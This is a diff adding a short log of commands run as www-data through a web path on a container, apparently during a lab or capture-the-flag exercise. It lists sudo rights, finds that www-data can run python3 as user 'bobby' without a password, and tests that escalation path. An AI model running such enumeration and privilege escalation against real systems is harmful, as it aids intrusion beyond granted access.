@@ -1,0 +1,18 @@
+=== AS www-data (web path): sudo -n -l ===
+Matching Defaults entries for www-data on 81548424282c:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on 81548424282c:
+    (bobby) NOPASSWD: /usr/bin/python3
+
+[http=200]
+
+=== AS www-data (web path): ls -l /usr/bin/python3 ===
+[http=200]
+
+=== AS www-data (web path): command -v python3 python python2 ===
+[http=200]
+
+=== AS www-data (web path): sudo -n -u bobby /usr/bin/python3 -c print(1); echo SUDO_RC=$? ===
+[http=200]
+
